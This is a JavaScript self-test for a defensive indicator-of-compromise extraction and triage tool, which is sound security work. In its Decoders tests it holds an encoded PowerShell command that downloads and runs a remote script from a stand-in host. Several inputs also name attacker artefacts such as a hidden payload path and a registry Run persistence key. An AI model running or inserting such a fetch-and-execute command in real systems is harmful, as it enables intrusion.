/* Self-test for the extraction engine. Open tests.html in a browser, or run: node assets/tests.js */
(function () {
  var IOC = (typeof module === 'object' && module.exports) ? require('./ioc.js') : window.IOC;
  var SAMPLES = (typeof module === 'object' && module.exports) ? require('./samples.js') : window.SAMPLES;
  var results = [], group = '';

  function describe(name, fn) { group = name; fn(); }
  function eq(actual, expected, label) {
    var a = JSON.stringify(actual), e = JSON.stringify(expected);
    results.push({ group: group, label: label, ok: a === e, detail: a === e ? '' : 'expected ' + e + '\n     got ' + a });
  }
  function ok(cond, label) { results.push({ group: group, label: label, ok: !!cond, detail: cond ? '' : 'condition was false' }); }
  function vals(list, type) { return list.filter(function (i) { return i.type === type; }).map(function (i) { return i.value; }); }
  function ex(t, o) { return IOC.extract(t, o); }
  function urlOf(t) { return ex(t).filter(function (i) { return i.type === 'url'; })[0]; }

  describe('IPv4', function () {
    eq(vals(ex('conn from 203.0.113.9 to 10.0.0.5'), 'ipv4'), ['203.0.113.9', '10.0.0.5'], 'finds plain addresses');
    eq(vals(ex('bad 999.1.1.1 and 256.1.1.1'), 'ipv4'), [], 'rejects out-of-range octets');
    eq(vals(ex('version 1.2.3.4.5 build'), 'ipv4'), [], 'ignores dotted version strings with 5 groups');
    eq(vals(ex('198.51.100.7:443 and 192.0.2.1/24'), 'ipv4'), ['198.51.100.7', '192.0.2.1'], 'handles ports and CIDR');
    eq(vals(ex('hit 203.0.113.9 then 203.0.113.9 again'), 'ipv4').length, 1, 'dedupes');
    eq(ex('203.0.113.9 203.0.113.9 203.0.113.9')[0].count, 3, 'keeps a count');
    eq(IOC.ipv4Scope('10.1.2.3'), 'private', '10/8 is private');
    eq(IOC.ipv4Scope('172.16.0.1'), 'private', '172.16/12 is private');
    eq(IOC.ipv4Scope('172.32.0.1'), 'public', '172.32 is not private');
    eq(IOC.ipv4Scope('192.168.1.1'), 'private', '192.168/16 is private');
    eq(IOC.ipv4Scope('127.0.0.1'), 'loopback', 'loopback');
    eq(IOC.ipv4Scope('169.254.1.1'), 'link-local', 'link-local');
    eq(IOC.ipv4Scope('100.64.0.1'), 'cgnat', 'carrier-grade NAT');
    eq(IOC.ipv4Scope('203.0.113.5'), 'documentation', 'RFC5737 documentation range');
    eq(IOC.ipv4Scope('8.8.8.8'), 'public', 'public');
    ok(ex('10.0.0.1')[0].flags.indexOf('internal') >= 0, 'private IP gets the internal flag');
  });

  describe('IPv6', function () {
    eq(vals(ex('to 2001:db8:85a3::8a2e:370:7334 ok'), 'ipv6'), ['2001:db8:85a3::8a2e:370:7334'], 'compressed address');
    eq(vals(ex('loop ::1 here'), 'ipv6'), ['::1'], 'loopback');
    eq(vals(ex('time 12:30:45 and mac aa:bb:cc:dd:ee:ff'), 'ipv6'), [], 'timestamps and MACs are not IPv6');
    eq(IOC.ipv6Scope('fe80::1'), 'link-local', 'link-local scope');
    eq(IOC.ipv6Scope('fd12::1'), 'private', 'unique local scope');
    eq(IOC.ipv6Scope('2001:db8::1'), 'documentation', 'documentation scope');
  });

  describe('Domains and URLs', function () {
    eq(vals(ex('visit evil-site.ru today'), 'domain'), ['evil-site.ru'], 'finds a domain');
    eq(vals(ex('see Sub.Evil.Example.com now'), 'domain'), ['sub.evil.example.com'], 'lower-cases');
    eq(vals(ex('opened C:\\temp\\update.zip and notes.txt and main.py'), 'domain'), [], 'file names are not domains');
    eq(vals(ex('loaded System.IO.File and Net.WebClient'), 'domain'), [], '.NET namespaces are not domains');
    eq(vals(ex('run evil.ru.exe now'), 'domain'), ['evil.ru'], 'trims a trailing file extension');
    eq(vals(ex('go to http://a.example.com/path?x=1.'), 'url'), ['http://a.example.com/path?x=1'], 'URL loses trailing full stop');
    ok(vals(ex('http://a.example.com/x'), 'domain').indexOf('a.example.com') >= 0, 'URL host also becomes a domain');
    ok(urlOf('http://203.0.113.5/x').flags.indexOf('ip-host') >= 0, 'raw-IP URL is flagged');
    ok(vals(ex('http://203.0.113.5/x'), 'ipv4').indexOf('203.0.113.5') >= 0, 'raw-IP URL host becomes an IP');
    ok(urlOf('http://user:pw@a.example.com/').flags.indexOf('credentials-in-url') >= 0, 'credentials in URL are flagged');
    ok(urlOf('http://a.example.com:8080/').flags.indexOf('non-standard-port') >= 0, 'odd port is flagged');
    ok(urlOf('http://bit.ly/abc').flags.indexOf('shortener') >= 0, 'shortener is flagged');
    ok(ex('x.tk')[0].flags.indexOf('risky-tld') >= 0, 'risky TLD flagged');
    ok(ex('example.com')[0].flags.indexOf('reserved') >= 0, 'example.com marked reserved');
    ok(ex('xn--80ak6aa92e.example.org').some(function (i) { return i.flags.indexOf('punycode') >= 0; }), 'punycode flagged');
  });

  describe('Defang / refang', function () {
    eq(IOC.defang('http://evil.example.com/a', 'url'), 'hxxp[://]evil[.]example[.]com/a', 'defang URL');
    eq(IOC.defang('203.0.113.9', 'ipv4'), '203[.]0[.]113[.]9', 'defang IPv4');
    eq(IOC.defang('a@b.example.com', 'email'), 'a[@]b[.]example[.]com', 'defang email');
    eq(IOC.defang('9f86d081', 'sha256'), '9f86d081', 'hashes are left alone');
    eq(IOC.refang('hxxps[:]//evil[.]example[.]com'), 'https://evil.example.com', 'refang URL');
    eq(IOC.refang('user[at]example(.)com'), 'user@example.com', 'refang email');
    eq(vals(ex('hxxp://x[.]example[.]net/p'), 'url'), ['http://x.example.net/p'], 'extract refangs by default');
    eq(vals(ex('hxxp://x[.]example[.]net/p', { refang: false }), 'url'), [], 'refang can be turned off');
    eq(IOC.refang(IOC.defang('https://a.example.com/b?c=d', 'url')), 'https://a.example.com/b?c=d', 'defang then refang round-trips');
  });

  describe('Hashes, CVEs, emails', function () {
    var md5 = '5d41402abc4b2a76b9719d911017c592', sha1 = 'aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d';
    var sha256 = '2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824';
    var all = ex(['md5 ' + md5, 'sha1 ' + sha1, 'sha256 ' + sha256.toUpperCase()].join('\n'));
    eq(vals(all, 'md5'), [md5], 'MD5');
    eq(vals(all, 'sha1'), [sha1], 'SHA-1');
    eq(vals(all, 'sha256'), [sha256], 'SHA-256 (lower-cased)');
    eq(vals(ex('x' + md5 + '0'), 'md5'), [], 'longer hex run is not an MD5');
    ok(ex('d41d8cd98f00b204e9800998ecf8427e')[0].flags.indexOf('empty-file-hash') >= 0, 'empty-file hash flagged');
    eq(vals(ex('see cve-2021-44228 and CVE-2017-11882.'), 'cve'), ['CVE-2021-44228', 'CVE-2017-11882'], 'CVEs upper-cased');
    eq(vals(ex('mail Bob.Smith@Example.COM now'), 'email'), ['bob.smith@example.com'], 'email lower-cased');
    ok(vals(ex('bob@evil-site.ru'), 'domain').indexOf('evil-site.ru') >= 0, 'email domain becomes a domain');
    eq(vals(ex('bob@evil-site.ru'), 'domain').length, 1, 'email local part is not a domain');
  });

  describe('Paths and registry', function () {
    eq(vals(ex('ran C:\\Windows\\System32\\cmd.exe /c whoami'), 'path'), ['C:\\Windows\\System32\\cmd.exe'], 'Windows path stops at the space');
    eq(vals(ex('opened C:\\Program Files\\Microsoft Office\\WINWORD.EXE now'), 'path'), ['C:\\Program Files\\Microsoft Office\\WINWORD.EXE'], 'directory names with spaces');
    eq(vals(ex('{"p":"C:\\\\Users\\\\bob\\\\a.exe"}'), 'path'), ['C:\\Users\\bob\\a.exe'], 'JSON-escaped path');
    eq(vals(ex('share \\\\fileserver\\public\\x.docx'), 'path'), ['\\\\fileserver\\public\\x.docx'], 'UNC path');
    eq(vals(ex('wrote /tmp/.hidden/payload.sh and /etc/cron.d/x'), 'path'), ['/tmp/.hidden/payload.sh', '/etc/cron.d/x'], 'unix paths');
    eq(vals(ex('http://a.example.com/etc/passwd'), 'path'), [], 'URL path is not a unix path');
    eq(vals(ex('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Evil = x'), 'regkey'), ['HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Evil'], 'registry run key');
    eq(vals(ex('HKEY_LOCAL_MACHINE\\SYSTEM\\Foo'), 'regkey'), ['HKEY_LOCAL_MACHINE\\SYSTEM\\Foo'], 'long hive name');
  });

  describe('Decoders', function () {
    var enc = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcABhAHkAbABvAGEAZAAtAGgAbwBzAHQALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALwBzAHQAYQBnAGUAMgAuAHAAcwAxACcAKQA=';
    eq(IOC.decode('base64', 'aGVsbG8gd29ybGQ=').output, 'hello world', 'base64');
    eq(IOC.decode('base64', 'aGVsbG8gd29ybGQ').output, 'hello world', 'base64 without padding');
    eq(IOC.decode('hex', '68 65 6c 6c 6f').output, 'hello', 'hex with spaces');
    eq(IOC.decode('hex', '0x680x65').output, 'he', 'hex with 0x prefixes');
    eq(IOC.decode('hex', '\\x68\\x69').output, 'hi', 'hex with \\x prefixes');
    eq(IOC.decode('url', 'a%20b%2Fc').output, 'a b/c', 'url decode');
    eq(IOC.decode('rot13', 'Uryyb').output, 'Hello', 'rot13');
    eq(IOC.decode('rot13', IOC.decode('rot13', 'Round Trip').output).output, 'Round Trip', 'rot13 twice');
    ok(IOC.decode('powershell', 'powershell -nop -enc ' + enc).output.indexOf("DownloadString('http://payload-host.example.com/stage2.ps1')") > 0, 'PowerShell -enc (UTF-16LE)');
    eq(IOC.decode('base64', '!!!').ok, false, 'bad base64 reports an error');
    eq(IOC.decode('hex', 'abc').ok, false, 'odd hex reports an error');
    eq(IOC.detectMode('powershell -enc ' + enc), 'powershell', 'auto detects PowerShell');
    eq(IOC.detectMode('a%20b'), 'url', 'auto detects url encoding');
    eq(IOC.decode('auto', 'aGVsbG8gd29ybGQ=').output, 'hello world', 'auto decodes base64');
    eq(IOC.scanEncoded('run -enc ' + enc).length, 1, 'scan finds an encoded blob in text');
    eq(IOC.scanEncoded('hash 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824').length, 0, 'a hash is not treated as base64');
  });

  describe('Email headers', function () {
    var phish = SAMPLES.filter(function (s) { return s.id === 'phish'; })[0].text;
    var h = IOC.parseHeaders(phish);
    ok(IOC.looksLikeHeaders(phish), 'detects headers');
    ok(!IOC.looksLikeHeaders('just some log line from 10.0.0.1'), 'plain text is not headers');
    eq(h.auth.spf, 'fail', 'SPF fail');
    eq(h.auth.dkim, 'none', 'DKIM none');
    eq(h.auth.dmarc, 'fail', 'DMARC fail');
    eq(h.hops.length, 2, 'two Received hops');
    eq(h.hops[0].ips, ['198.51.100.23'], 'oldest hop first, with its IP');
    eq(h.hops[1].delay, 13, 'delay between hops in seconds');
    eq(h.origin.ip, '198.51.100.23', 'first non-internal hop');
    eq(h.from.domain, 'accounts-payable.example.com', 'From domain');
    eq(h.returnPath.domain, 'billing-notice.example.net', 'Return-Path domain');
    ok(h.findings.some(function (f) { return /Return-Path/.test(f.text); }), 'flags From / Return-Path mismatch');
    ok(h.findings.some(function (f) { return /Reply-To/.test(f.text); }), 'flags Reply-To mismatch');
    ok(h.findings.some(function (f) { return /display-name spoofing/.test(f.text); }), 'flags display-name spoofing');
    ok(h.findings.some(function (f) { return f.level === 'high' && /DMARC/.test(f.text); }), 'DMARC failure is high');
    var clean = IOC.parseHeaders('From: Ann <ann@example.com>\nReturn-Path: <ann@example.com>\nTo: bob@example.com\nSubject: hi\nAuthentication-Results: mx; spf=pass smtp.mailfrom=example.com; dkim=pass; dmarc=pass header.from=example.com\n\nbody');
    eq(clean.findings.filter(function (f) { return f.level !== 'info'; }).length, 0, 'a clean message has no warnings');
    eq(IOC.parseAddr('"Bob B" <Bob@X.com>').addr, 'bob@x.com', 'address parser');
  });

  describe('Full analysis of the samples', function () {
    var edr = IOC.analyze(SAMPLES.filter(function (s) { return s.id === 'edr'; })[0].text);
    ok(edr.decoded.length === 1, 'EDR sample: finds one encoded payload');
    ok(edr.iocs.some(function (i) { return i.type === 'url' && i.value === 'http://payload-host.example.com/stage2.ps1' && i.decoded; }), 'EDR sample: URL recovered from inside the encoded payload');
    eq(vals(edr.iocs, 'cve'), ['CVE-2017-11882'], 'EDR sample: CVE');
    eq(vals(edr.iocs, 'regkey').length, 1, 'EDR sample: run key');
    eq(vals(edr.iocs, 'sha256').length + vals(edr.iocs, 'md5').length, 2, 'EDR sample: both hashes');
    var internal = edr.iocs.filter(function (i) { return i.type === 'ipv4' && i.flags.indexOf('internal') >= 0; }).map(function (i) { return i.value; });
    eq(internal, ['10.20.30.41'], 'EDR sample: internal host is flagged internal');
    var phish2 = IOC.analyze(SAMPLES.filter(function (s) { return s.id === 'phish'; })[0].text);
    ok(phish2.email, 'phish sample: email parsed');
    ok(phish2.iocs.some(function (i) { return i.type === 'url' && i.value === 'https://invoice-portal.example.net/login?id=88231'; }), 'phish sample: defanged URL extracted');
    ok(phish2.iocs.some(function (i) { return i.type === 'email' && i.value === 'collect@free-mail.example.org'; }), 'phish sample: [at] email extracted');
    ok(phish2.iocs.some(function (i) { return i.type === 'sha256'; }), 'phish sample: hash extracted');
    var proxy = IOC.analyze(SAMPLES.filter(function (s) { return s.id === 'proxy'; })[0].text);
    ok(proxy.iocs.some(function (i) { return i.type === 'ipv6' && i.value === '2001:db8:85a3::8a2e:370:7334'; }), 'proxy sample: IPv6');
    ok(proxy.iocs.some(function (i) { return i.type === 'url' && i.flags.indexOf('credentials-in-url') >= 0; }), 'proxy sample: credentials in URL');
    ok(proxy.iocs.some(function (i) { return i.type === 'url' && i.flags.indexOf('shortener') >= 0; }), 'proxy sample: shortener');
  });

  describe('Report, ticket and Sigma', function () {
    var a = IOC.analyze(SAMPLES.filter(function (s) { return s.id === 'edr'; })[0].text);
    a.iocs.forEach(function (i) { if (i.type === 'sha256') i.verdict = 'malicious'; });
    var r = IOC.buildReport({ iocs: a.iocs, email: a.email, now: '2026-11-10T00:00:00Z', notes: 'Looks like a macro dropper.' });
    ok(r.markdown.indexOf('# ') === 0, 'markdown report has a title');
    ok(r.markdown.indexOf('payload-host[.]example[.]com') > 0, 'report defangs indicators');
    ok(r.markdown.indexOf('Looks like a macro dropper.') > 0, 'report carries analyst notes');
    ok(r.markdown.indexOf('## Incident ticket draft') > 0, 'report has a ticket draft');
    eq(r.json.schema, 'hyperflow.triage/1', 'json schema tag');
    eq(r.severity, 'high', 'a malicious verdict raises severity to high');
    eq(r.json.observables.length, a.iocs.length, 'json lists every observable');
    eq(JSON.parse(JSON.stringify(r.json)).title, r.title, 'json round-trips');
    eq(IOC.buildReport({ iocs: IOC.analyze(SAMPLES[1].text).iocs, email: null }).severity, 'medium', 'a decoded payload or CVE is never rated low');
    eq(IOC.buildReport({ iocs: IOC.extract('see 10.0.0.1'), email: null }).severity, 'low', 'a lone internal IP stays low');
    var overridden =IOC.buildReport({ iocs: a.iocs, email: null, severity: 'critical' });
    eq(overridden.priority, 'P1 - Critical', 'analyst severity override sets priority');
    var s = IOC.buildSigma(a.iocs, { id: 'test', date: '2026-11-10' });
    ok(s.indexOf('category: process_creation') > 0, 'sigma has a hash rule');
    ok(s.indexOf("'SHA256=2CF24DBA") > 0, 'sigma hash is in Sysmon Hashes format');
    ok(s.indexOf('category: registry_set') > 0, 'sigma has a registry rule');
    ok(s.indexOf('10.20.30.41') < 0, 'sigma skips internal IPs');
    ok(s.indexOf('payload-host.example.com') < 0, 'sigma skips reserved example domains');
    ok(s.indexOf('198.51.100.77') > 0, 'sigma keeps external IPs');
    ok(IOC.buildSigma(a.iocs, { id: 'test', date: '2026-11-10', includeReserved: true }).indexOf('payload-host.example.com') > 0, 'sigma can include reserved values for demos');
    ok(/condition: /.test(s), 'sigma has conditions');
    var none = IOC.buildSigma([{ type: 'ipv4', value: '10.0.0.1', flags: ['internal'] }]);
    ok(none.indexOf('No indicators suitable') >= 0, 'sigma explains when nothing qualifies');
    var empty = IOC.buildReport({ iocs: [], email: null });
    ok(empty.summary.indexOf('No indicators') >= 0, 'empty input produces an honest summary');
  });

  /* ---------------------------------------------------------------- output */
  var fails = results.filter(function (r) { return !r.ok; });
  if (typeof document !== 'undefined') {
    var root = document.getElementById('results'), last = '';
    document.getElementById('summary').textContent = (results.length - fails.length) + ' / ' + results.length + ' checks passed';
    document.getElementById('summary').className = fails.length ? 'bad' : 'good';
    results.forEach(function (r) {
      if (r.group !== last) { var h = document.createElement('h2'); h.textContent = r.group; root.appendChild(h); last = r.group; }
      var d = document.createElement('div'); d.className = 'row ' + (r.ok ? 'pass' : 'fail');
      d.textContent = (r.ok ? 'PASS  ' : 'FAIL  ') + r.label + (r.ok ? '' : '\n' + r.detail);
      root.appendChild(d);
    });
    window.__testResults = { total: results.length, failed: fails.length };
  } else {
    var lastG = '';
    results.forEach(function (r) {
      if (r.group !== lastG) { console.log('\n' + r.group); lastG = r.group; }
      console.log('  ' + (r.ok ? 'ok   ' : 'FAIL ') + r.label + (r.ok ? '' : '\n       ' + r.detail));
    });
    console.log('\n' + (results.length - fails.length) + '/' + results.length + ' passed');
    process.exit(fails.length ? 1 : 0);
  }
}());
